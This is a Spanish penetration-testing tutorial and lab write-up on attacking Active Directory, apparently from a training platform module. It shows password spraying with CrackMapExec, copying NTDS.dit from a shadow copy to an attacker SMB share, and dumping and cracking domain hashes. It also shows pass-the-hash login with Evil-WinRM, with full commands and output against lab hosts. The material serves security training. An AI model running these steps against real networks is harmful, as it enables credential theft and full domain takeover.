
# Atacando Active Directory

## <mark style="color:purple;">Ataques a Active Directory y NTDS.dit</mark>

`Active Directory`( `AD`) es un servicio de directorio común y crítico en las redes empresariales modernas. AD es algo que encontraremos repetidamente, por lo que debemos estar familiarizados con varios métodos que podemos usar para atacar y defender estos entornos AD. Es seguro concluir que si la organización usa Windows, entonces se usa AD para administrar esos sistemas Windows. Atacar AD es un tema tan extenso y significativo que tenemos varios módulos que cubren AD.

En esta sección, nos centraremos principalmente en cómo podemos extraer credenciales mediante el uso de un `ataque de diccionario contra cuentas AD` y `dumpear hashes` del archivo `NTDS.dit`.

{% hint style="info" %}
El `ntds.dit` es el archivo almacenado en un controlador de dominio que contiene los hashes de contraseñas de todas las cuentas de dominio.
{% endhint %}

Como muchos de los ataques que hemos cubierto hasta ahora, nuestro objetivo debe ser accesible a través de la red. Esto significa que es muy probable que necesitemos tener un punto de apoyo o `foothold` establecido en la red interna a la que está conectado el objetivo. Dicho esto, hay situaciones en las que una organización puede estar utilizando el reenvío de puertos para reenviar el protocolo de escritorio remoto ( `3389`) u otros protocolos utilizados para el acceso remoto en su [enrutador perimetral](https://www.cisco.com/c/en/us/products/routers/what-is-an-edge-router.html) a un sistema en su red interna.&#x20;

Ten en cuenta que la mayoría de los métodos cubiertos en este módulo simulan los pasos posteriores a un compromiso inicial y se establece un punto de apoyo en una red interna. Antes de ponernos manos a la obra con los métodos de ataque, consideremos el proceso de autenticación una vez que un sistema Windows se ha unido al dominio. Este enfoque nos ayudará a comprender mejor la importancia de Active Directory y los ataques a contraseñas a los que puede ser susceptible.

![Autenticación de anuncios](https://academy.hackthebox.com/storage/modules/147/ADauthentication_diagram.png)

Una vez que un sistema Windows se une a un dominio, `ya no se hace referencia predeterminada a la base de datos SAM para validar las solicitudes de inicio de sesión`. Ese sistema unido a un dominio ahora enviará todas las solicitudes de autenticación para que el controlador de dominio las valide antes de permitir que un usuario inicie sesión. Esto no significa que la base de datos SAM ya no pueda utilizarse.&#x20;

Alguien que quiera iniciar sesión usando una cuenta local en la base de datos SAM aún puede hacerlo especificando el dispositivo `hostname` seguido por `Username`(Ejemplo: `WS01/nameofuser`)  o con acceso directo al dispositivo y luego escribiendo `./` en la interfaz de usuario de inicio de sesión en el campo `Username`. Esto es digno de consideración porque debemos tener en cuenta qué componentes del sistema se ven afectados por los ataques que realizamos.&#x20;

También puede brindarnos vías de ataque adicionales a considerar cuando apuntamos a sistemas operativos de escritorio de Windows o sistemas operativos de servidores de Windows con acceso físico directo o a través de una red. Hay que tener en cuenta que también podemos estudiar los ataques NTDS haciendo un seguimiento de esta [técnica](https://attack.mitre.org/techniques/T1003/003/) .

***

## <mark style="color:purple;">Ataques de diccionario contra cuentas AD usando CrackMapExec</mark>

Tenga en cuenta que un ataque de diccionario consiste esencialmente en utilizar la potencia de una computadora para adivinar un nombre de usuario y/o contraseña utilizando una lista personalizada de posibles nombres de usuario y contraseñas. Puede ser bastante `ruidoso` (fácil de detectar) llevar a cabo estos ataques a través de una red porque pueden generar una gran cantidad de tráfico de red y alertas en el sistema de destino, así como eventualmente ser rechazados debido a restricciones de intento de inicio de sesión que pueden aplicarse mediante el uso de [Política de grupo](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791\(v=ws.11\)) .

Cuando nos encontramos en un escenario en el que un ataque de diccionario es el siguiente paso viable, podemos beneficiarnos al intentar nuestro ataque tanto como sea posible. En este caso, podemos considerar la organización con la que estamos trabajando para realizar la interacción y utilizar búsquedas en varios sitios web de redes sociales y buscar un directorio de empleados en el sitio web de la empresa. Hacer esto puede resultar en que obtengamos los nombres de los empleados que trabajan en la organización. Una de las primeras cosas que obtendrá un nuevo empleado es un nombre de usuario. Muchas organizaciones siguen una convención de nomenclatura al crear nombres de usuarios de empleados. Aquí hay algunas convenciones comunes a considerar:

| Convención de nombre de usuario     | Ejemplo práctico para Jane Jill Doe |
| ----------------------------------- | ----------------------------------- |
| `firstinitiallastname`              | jdoe                                |
| `firstinitialmiddleinitiallastname` | jjdoe                               |
| `firstnamelastname`                 | janedoe                             |
| `firstname.lastname`                | jane.doe                            |
| `lastname.firstname`                | doe.jane                            |
| `nickname`                          | janedo                              |

Muchas veces, la estructura de una dirección de correo electrónico nos dará el nombre de usuario del empleado (estructura: nombre de usuario\@dominio). Por ejemplo, de la dirección de correo electrónico `jdoe@inlanefreight.com`, vemos que `jdoe` es el nombre de usuario.

Un consejo de MrB3n: a menudo podemos encontrar la estructura del correo electrónico buscando en Google el nombre de dominio, es decir, "@inlanefreight.com" y obtener algunos correos electrónicos válidos. A partir de ahí, podemos utilizar un script para extraer varios sitios de redes sociales y combinar posibles nombres de usuario válidos. Algunas organizaciones intentan ofuscar sus nombres de usuario para evitar el [password spraying](/ethical-hacking-cheatsheet/active-directory/active-directory/password-spraying.md), por lo que pueden asignarles un alias como a907 (o algo similar) a joe.smith.&#x20;

De esa manera, los mensajes de correo electrónico pueden llegar, pero el nombre de usuario interno real no se revela, lo que dificulta la difusión de contraseñas. A veces puedes usar Google Dorks para buscar “tipo de archivo inlanefreight.com: pdf” y encontrar algunos nombres de usuario válidos en las propiedades del PDF si se generaron usando un editor de gráficos. A partir de ahí, es posible que pueda discernir la estructura del nombre de usuario y potencialmente escribir un pequeño script para crear muchas combinaciones posibles y luego rociar para ver si alguna resulta válida.

### **Crear una lista personalizada de nombres de usuario**

Digamos que hemos investigado y recopilado una lista de nombres basada en información disponible públicamente. Mantendremos la lista relativamente corta para esta lección porque las organizaciones pueden tener una gran cantidad de empleados. Lista de ejemplo de nombres:

* Ben Williamson
* Bob Burgerstien
* Jim Stevenson
* Jill Johnson
* Jane Doe

Podemos crear una lista personalizada en nuestro host de ataque usando los nombres anteriores. Podemos usar un editor de texto basado en línea de comandos como `nano o gedit` o un editor de texto gráfico para crear nuestra lista. Nuestra lista puede verse así:

```shell-session
afsh4ck@kali]$ cat usernames.txt 
bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```

Por supuesto, esto es solo un ejemplo y no incluye todos los nombres, pero observe cómo podemos incluir una convención de nomenclatura diferente para cada nombre si aún no conocemos la convención de nomenclatura utilizada por la organización de destino.

Podemos crear manualmente nuestra(s) lista(s) o utilizar una herramienta `de generación automática de usernames` como [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) para convertir una lista de nombres reales en formatos de nombre de usuario comunes. Una vez que la herramienta se haya clonado en nuestro host de ataque local usando `Git`, podemos ejecutarla con una lista de nombres reales como se muestra en el siguiente ejemplo:

```shell-session
afsh4ck@kali$ ./username-anarchy -i /home/ltnbob/names.txt 

ben
benwilliamson
ben.williamson
benwilli
benwill
benw
b.williamson
bwilliamson
wben
w.ben
williamsonb
williamson
williamson.b
williamson.ben
bw
bob
bobburgerstien
bob.burgerstien
bobburge
bobburg
bobb
b.burgerstien
bburgerstien
bbob
b.bob
burgerstienb
burgerstien
burgerstien.b
burgerstien.bob
bb
jim
jimstevenson
jim.stevenson
jimsteve
jimstev
jims
j.stevenson
jstevenson
sjim
s.jim
stevensonj
stevenson
stevenson.j
stevenson.jim
js
jill
jilljohnson
jill.johnson
jilljohn
jillj
j.johnson
jjohnson
jjill
j.jill
johnsonj
johnson
johnson.j
johnson.jill
jj
jane
janedoe
jane.doe
janed
j.doe
jdoe
djane
d.jane
doej
doe
doe.j
doe.jane
jd
```

El uso de herramientas automatizadas puede ahorrarnos tiempo al elaborar listas. Aún así, nos beneficiará dedicar todo el tiempo que podamos a intentar descubrir la convención de nomenclatura que utiliza una organización con los nombres de usuario porque esto reducirá la necesidad de adivinar la convención de nomenclatura.

Es ideal para limitar al máximo la necesidad de adivinar al realizar ataques a contraseñas.

### **Lanzando el ataque con CrackMapExec**

Una vez que tengamos nuestra lista preparada o descubramos la convención de nomenclatura y algunos nombres de empleados, podemos lanzar nuestro ataque contra el controlador de dominio objetivo utilizando una herramienta como CrackMapExec. Podemos usarlo junto con el protocolo SMB para enviar solicitudes de inicio de sesión al controlador de dominio de destino. Aquí está el comando para hacerlo:

```shell-session
afsh4ck@kali$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

SMB         10.129.201.57     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [-] inlanefrieght.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.201.57     445    DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! 
```

En este ejemplo, CrackMapExec utiliza SMB para intentar iniciar sesión como usuario (`-u`) `bwilliamson` usando una lista de contraseñas (`-p`) que contiene una lista de contraseñas de uso común ( `/usr/share/wordlists/fasttrack.txt`). Si los administradores configuraron una política de bloqueo de cuenta, este ataque podría bloquear la cuenta a la que nos dirigimos. En el momento de escribir este artículo (enero de 2022), no se aplica una política de bloqueo de cuenta de forma predeterminada con las políticas de grupo predeterminadas que se aplican a un dominio de Windows, lo que significa que es posible que nos encontremos con entornos vulnerables a este ataque exacto que estamos practicando. .

### **Registros de eventos del ataque**

![Registros de eventos del ataque](https://academy.hackthebox.com/storage/modules/147/events_dc.png)

Puede resultar útil saber qué pudo haber quedado tras un ataque. Saber esto puede hacer que nuestras recomendaciones de reparación sean más impactantes y valiosas para el cliente con el que trabajamos. En cualquier sistema operativo Windows, un administrador puede navegar a `Event Viewer` y ver los eventos de seguridad para ver las acciones exactas que se registraron. Esto puede informar las decisiones para implementar controles de seguridad más estrictos y ayudar en cualquier posible investigación que pueda estar involucrada después de una infracción.

Una vez que hayamos descubierto algunas credenciales, podríamos proceder a intentar obtener acceso remoto al controlador de dominio de destino y capturar el archivo NTDS.dit.

***

## <mark style="color:purple;">Capturando NTDS.dit</mark>

`NT Directory Services`(`NTDS`) es el servicio de directorio utilizado con AD para buscar y organizar recursos de red. El archivo `NTDS.dit` se almacena en `%systemroot%/ntds` en los controladores de dominio en un [bosque](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model) . El `.dit` significa  [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). Este es el archivo de base de datos principal asociado con AD y almacena todos los nombres de usuario del dominio, hashes de contraseñas y otra información crítica del esquema. Si se puede capturar este archivo, podríamos potencialmente comprometer todas las cuentas del dominio de forma similar a la técnica que cubrimos en la sección [`Atacando a SAM`](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/windows-attacks/atacando-a-sam.md) de este módulo. Mientras practicamos esta técnica, considere la importancia de proteger AD y piense en algunas formas de evitar que ocurra este ataque.

### **Conexión a un DC con Evil-WinRM**

Podemos conectarnos a un Domain Controller utilizando las credenciales que capturamos.

```shell-session
afsh4ck@kali$ evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```

Evil-WinRM se conecta a un objetivo mediante el servicio de administración remota de Windows combinado con el protocolo de comunicación remota de PowerShell para establecer una sesión de PowerShell con el objetivo.

### **Comprobar la membresía del grupo local**

Una vez conectados, podemos comprobar qué privilegios tiene `bwilliamson`. Podemos comenzar mirando la membresía del grupo local usando el comando:

```powershell
*Evil-WinRM* PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

Estamos comprobando si la cuenta tiene derechos de administrador local. Para hacer una copia del archivo NTDS.dit, necesitamos derechos de administrador local ( `Administrators group`) o administrador de dominio ( `Domain Admins group`) o equivalente. También querremos comprobar qué privilegios de dominio tenemos.

### **Comprobación de los privilegios de la cuenta de usuario y dominio**

```powershell
*Evil-WinRM* PS C:\> net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/2022 12:48:58 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/14/2022 2:07:49 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.
```

Esta cuenta tiene derechos de Administrador y de Administrador de dominio, lo que significa que podemos hacer casi cualquier cosa que queramos, incluida hacer una copia del archivo NTDS.dit.

### **Crear un Shadow Copy de C:**

Podemos usar `vssadmin` para crear una [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) de la unidad C: o cualquier volumen que el administrador eligió al instalar AD inicialmente. Es muy probable que NTDS se almacene en C: ya que esa es la ubicación predeterminada seleccionada durante la instalación, pero es posible cambiar la ubicación. Usamos VSS para esto porque está diseñado para hacer copias de volúmenes que se pueden leer y escribir activamente sin necesidad de desactivar una aplicación o sistema en particular. VSS es utilizado por muchos programas diferentes de respaldo y recuperación ante desastres para realizar operaciones.

```powershell
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

### **Copiar NTDS.dit desde VSS**

Luego podemos copiar el archivo NTDS.dit de la instantánea del volumen de C: a otra ubicación en la unidad para prepararnos para mover NTDS.dit a nuestro host de ataque.

```powershell
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
```

Antes de copiar NTDS.dit a nuestro host de ataque, es posible que deseemos utilizar la técnica que aprendimos anteriormente para crear un recurso compartido SMB en nuestro host de ataque. No dude en volver a la sección [`Atacando a SAM`](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/windows-attacks/atacando-a-sam.md) para revisar ese método si es necesario.

### **Transferencia de NTDS.dit al host de ataque**

Ahora se puede utilizar `cmd.exe /c move` para mover el archivo desde el DC de destino al recurso compartido en nuestro host de ataque.

{% code overflow="wrap" %}

```bash
afsh4ck@kali$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/kali/Descargas/
```

{% endcode %}

```powershell
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

        1 file(s) moved.		
```

### **Un método más rápido: usar CrackMapExec para capturar NTDS.dit**

Alternativamente, podemos beneficiarnos del uso de CrackMapExec para realizar los mismos pasos que se muestran arriba, todo con un solo comando. Este comando nos permite utilizar VSS para capturar y volcar rápidamente el contenido del archivo NTDS.dit cómodamente dentro de nuestra  terminal.

```shell-session
afsh4ck@kali$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds

SMB         10.129.201.57    445     DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefrieght.local) (signing:True) (SMBv1:False)
SMB         10.129.201.57    445     DC01             [+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)
SMB         10.129.201.57    445     DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.129.201.57    445     DC01           Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.129.201.57    445     DC01           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.201.57    445     DC01           DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
SMB         10.129.201.57    445     DC01           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cbb8a44ba74b5778a06c2d08b4ced802:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:1105:aad3b435b51404eeaad3b435b51404ee:4f3c625b54aa03e471691f124d5bf1cd:::
SMB         10.129.201.57    445     DC01           WIN-NKHHJGP3SMT:1106:aad3b435b51404eeaad3b435b51404ee:a74cc84578c16a6f81ec90765d5eb95f:::
SMB         10.129.201.57    445     DC01           WIN-K5E9CWYEG7Z:1107:aad3b435b51404eeaad3b435b51404ee:ec209bfad5c41f919994a45ed10e0f5c:::
SMB         10.129.201.57    445     DC01           WIN-5MG4NRVHF2W:1108:aad3b435b51404eeaad3b435b51404ee:7ede00664356820f2fc9bf10f4d62400:::
SMB         10.129.201.57    445     DC01           WIN-UISCTR0XLKW:1109:aad3b435b51404eeaad3b435b51404ee:cad1b8b25578ee07a7afaf5647e558ee:::
SMB         10.129.201.57    445     DC01           WIN-ETN7BWMPGXD:1110:aad3b435b51404eeaad3b435b51404ee:edec0ceb606cf2e35ce4f56039e9d8e7:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\bwilliamson:1125:aad3b435b51404eeaad3b435b51404ee:bc23a1506bd3c8d3a533680c516bab27:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\bburgerstien:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jstevenson:1131:aad3b435b51404eeaad3b435b51404ee:bc007082d32777855e253fd4defe70ee:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jjohnson:1133:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jdoe:1134:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         10.129.201.57    445     DC01           Administrator:aes256-cts-hmac-sha1-96:cc01f5150bb4a7dda80f30fbe0ac00bed09a413243c05d6934bbddf1302bc552
SMB         10.129.201.57    445     DC01           Administrator:aes128-cts-hmac-sha1-96:bd99b6a46a85118cf2a0df1c4f5106fb
SMB         10.129.201.57    445     DC01           Administrator:des-cbc-md5:618c1c5ef780cde3
SMB         10.129.201.57    445     DC01           DC01$:aes256-cts-hmac-sha1-96:113ffdc64531d054a37df36a07ad7c533723247c4dbe84322341adbd71fe93a9
SMB         10.129.201.57    445     DC01           DC01$:aes128-cts-hmac-sha1-96:ea10ef59d9ec03a4162605d7306cc78d
SMB         10.129.201.57    445     DC01           DC01$:des-cbc-md5:a2852362e50eae92
SMB         10.129.201.57    445     DC01           krbtgt:aes256-cts-hmac-sha1-96:1eb8d5a94ae5ce2f2d179b9bfe6a78a321d4d0c6ecca8efcac4f4e8932cc78e9
SMB         10.129.201.57    445     DC01           krbtgt:aes128-cts-hmac-sha1-96:1fe3f211d383564574609eda482b1fa9
SMB         10.129.201.57    445     DC01           krbtgt:des-cbc-md5:9bd5017fdcea8fae
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:aes256-cts-hmac-sha1-96:4b0618f08b2ff49f07487cf9899f2f7519db9676353052a61c2e8b1dfde6b213
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:aes128-cts-hmac-sha1-96:d2377357d473a5309505bfa994158263
SMB         10.129.201.57    445     DC01           inlanefrieght.local\jim:des-cbc-md5:79ab08755b32dfb6
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes256-cts-hmac-sha1-96:881e693019c35017930f7727cad19c00dd5e0cfbc33fd6ae73f45c117caca46d
SMB         10.129.201.57    445     DC01           WIN-IAUBULPG5MZ:aes128-cts-hmac-sha1-
     [+] Dumped 61 NTDS hashes to /home/bob/.cme/logs/DC01_10.10.15.30_2022-01-19_133529.ntds of which 15 were added to the database
```

***

## <mark style="color:purple;">Descifrando hashes y obteniendo credenciales</mark>

Podemos continuar con la creación de un archivo de texto que contenga todos los hashes NT, o podemos copiar y pegar individualmente un hash específico en una sesión de terminal y usar Hashcat para intentar descifrar el hash y una contraseña en texto sin cifrar.

### **Descifrar un único hash con Hashcat**

```shell-session
afsh4ck@kali$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

En muchas de las técnicas que hemos cubierto hasta ahora, hemos tenido éxito en descifrar los hashes que hemos obtenido.

`¿Qué pasa si no logramos descifrar un hash?`

***

## <mark style="color:purple;">Pass the Hash</mark>

Todavía podemos usar hashes para intentar autenticarnos en un sistema mediante un tipo de ataque llamado `Pass-the-Hash`( `PtH`). Un ataque PtH aprovecha el [protocolo de autenticación NTLM](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials) para autenticar a un usuario mediante un hash de contraseña. En lugar de `username`: `clear-text password` como formato para iniciar sesión, podemos usar `username`: `password-hash`. A continuación se muestra un ejemplo de cómo funcionaría esto:

### **Ejemplo de Pass-the-Hash con Evil-WinRM**

```shell-session
afsh4ck@kali$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

Podemos intentar utilizar este ataque cuando necesitemos movernos lateralmente a través de una red después del compromiso inicial de un objetivo.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.101.21
```

### <mark style="color:purple;">Ejercicio 1</mark>

> En un compromiso, visitó varios sitios de redes sociales y encontró los nombres de los empleados de Inlanefreight: John Marston IT Director, Carol Johnson Financial Controller y Jennifer Stapleton Logistics Manager. Decide utilizar estos nombres para realizar sus ataques de contraseña contra el controlador de dominio de destino. Envíe las credenciales de `John Marston` como respuesta. (Formato: nombre de usuario:contraseña, distingue entre mayúsculas y minúsculas).

Vamos a crear un archivo de texto `names.txt` con esos usuarios y los cargos separados:

{% code title="names.txt" overflow="wrap" %}

```
John Marston 
IT Director
Carol Johnson 
Financial Controller 
Jennifer Stapleton 
Logistics Manager
```

{% endcode %}

Luego con username anarchy vamos a mutar esas palabras:

{% embed url="<https://github.com/urbanadventurer/username-anarchy>" %}

```
./username-anarchy -i names.txt
john
johnmarston
john.marston
johnmars
johnm
j.marston
jmarston
mjohn
m.john
marstonj
marston
marston.j
marston.john
jm
it
itdirector
it.director
itdirect
itdire
itd
i.director
idirector
dit
d.it
directori
director
director.i
director.it
id
<--------SNIP--------->
```

Nos interesan solo las del usuario John Marston, así que nos crearemos un documento solo con las palabras asociadas a el.

Entonces vamos a atacar al DC con CrackMapExec para encontrar el password utilizando la lista de nombres de usuario:

```bash
crackmapexec smb 10.129.101.21 -u john.txt -p /usr/share/wordlists/fasttrack.txt

SMB         10.129.101.21   445    ILF-DC01         [-] ILF.local\jmarston:Password1 STATUS_LOGON_FAILURE 
SMB         10.129.101.21   445    ILF-DC01         [-] ILF.local\jmarston:Password2 STATUS_LOGON_FAILURE 
SMB         10.129.101.21   445    ILF-DC01         [-] ILF.local\jmarston:P@ssw0rd STATUS_LOGON_FAILURE 
SMB         10.129.101.21   445    ILF-DC01         [-] ILF.local\jmarston:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.101.21   445    ILF-DC01         [-] ILF.local\jmarston:P@55w0rd! STATUS_LOGON_FAILURE 
SMB         10.129.101.21   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
```

Encontramos las credenciales para el usuario jmarston:

```
jmarston:P@ssword!
```

### <mark style="color:purple;">Ejercicio 2</mark>

> Capture el archivo NTDS.dit y descargue los hashes. Utilice las técnicas que se enseñan en esta sección para descifrar la contraseña de Jennifer Stapleton. Envíe su contraseña en texto claro como respuesta.

De igual manera que el anterior usuario, cogemos los nombres de usuario generados por Username Anarchy pero para Jennifer Stapleton:

{% code title="jennifer.txt" %}

```
jennifer
jenniferstapleton
jennifer.stapleton
jennstap
jennifers
j.stapleton
jstapleton
sjennifer
s.jennifer
stapletonj
stapleton
stapleton.j
stapleton.jennifer
js
```

{% endcode %}

Y usamos esta wordlist para atacar el DC con CrackMapExec:

```
crackmapexec smb 10.129.101.21 -u jennifer.txt -p /usr/share/wordlists/fasttrack.txt

SMB         10.129.101.21   445    ILF-DC01         [*] Windows 10.0 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
SMB         10.129.101.21   445    ILF-DC01         [-] ILF.local\jstapleton:Spring2017 STATUS_LOGON_FAILURE 
SMB         10.129.101.21   445    ILF-DC01         [-] ILF.local\jstapleton:Spring2016 STATUS_LOGON_FAILURE 
SMB         10.129.101.21   445    ILF-DC01         [-] ILF.local\jstapleton:Spring2015 STATUS_LOGON_FAILURE
SMB         10.129.101.21   445    ILF-DC01         [-] ILF.local\jstapleton:Winter2011 STATUS_LOGON_FAILURE 
SMB         10.129.101.21   445    ILF-DC01         [-] ILF.local\jstapleton:Winter2010 STATUS_LOGON_FAILURE 
SMB         10.129.101.21   445    ILF-DC01         [-] ILF.local\jstapleton:Winter2009 STATUS_LOGON_FAILURE 
SMB         10.129.101.21   445    ILF-DC01         [+] ILF.local\jstapleton:Winter2008 
```

Tenemos las credenciales, `jstapleton:Winter2008`, pero igualmente vamos a capturar el ntds.dit con Evil-WinRM:

```bash
evil-winrm -i 10.129.101.21 -u jstapleton -p 'Winter2008'
```

Con estas credenciales no nos podemos conectar por Evil-WinRM, nos da un error, asi que nos conectamos con las credenciales de John:

```bash
evil-winrm -i 10.129.101.21 -u jmarston -p 'P@ssword!'

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\jmarston\Documents>
```

Nos conectamos correctamente, y enumeramos info del usuario `jstapleton`:

```powershell
*Evil-WinRM* PS C:\Users\jmarston\Documents> net user jstapleton
User name                    jstapleton
Full Name                    Jennifer Stapleton
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/21/2022 1:23:27 PM
Password expires             Never
Password changeable          1/22/2022 1:23:27 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/27/2024 10:12:32 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Leadership
The command completed successfully.
```

Como vemos Jennifer no tiene permisos en el sistema, por lo que tendremos que acceder al `ntds.dit` con el usuario John,  que si tiene permisos de administrador en el sistema :

```powershell
*Evil-WinRM* PS C:\Users\jmarston\Documents> net user jmarston
User name                    jmarston
Full Name                    John Marston
Comment                      IT Directory
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/21/2022 1:07:42 PM
Password expires             Never
Password changeable          1/22/2022 1:07:42 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   3/27/2024 9:48:59 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Admins        *Domain Users
                             *Leadership
                             
The command completed successfully.
```

Creamos una Shadow Copy de C y copiamos el NTDS.dit en C:

```powershell
*Evil-WinRM* PS C:\Users\jmarston\Documents> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {99cab4bb-d188-4238-aaee-04d48cf129b8}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

```powershell
*Evil-WinRM* PS C:\Users\jmarston\Documents> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS.dit
        1 file(s) copied.
*Evil-WinRM* PS C:\Users\jmarston\Documents> cd /
ls*Evil-WinRM* PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/21/2022   1:28 PM                InternalProjects
d-----       12/14/2020   7:11 PM                PerfLogs
d-r---       12/14/2020   6:38 PM                Program Files
d-----         2/8/2022   3:54 PM                Program Files (x86)
d-r---        1/21/2022  12:44 PM                Users
d-----        2/16/2022   1:27 PM                Windows
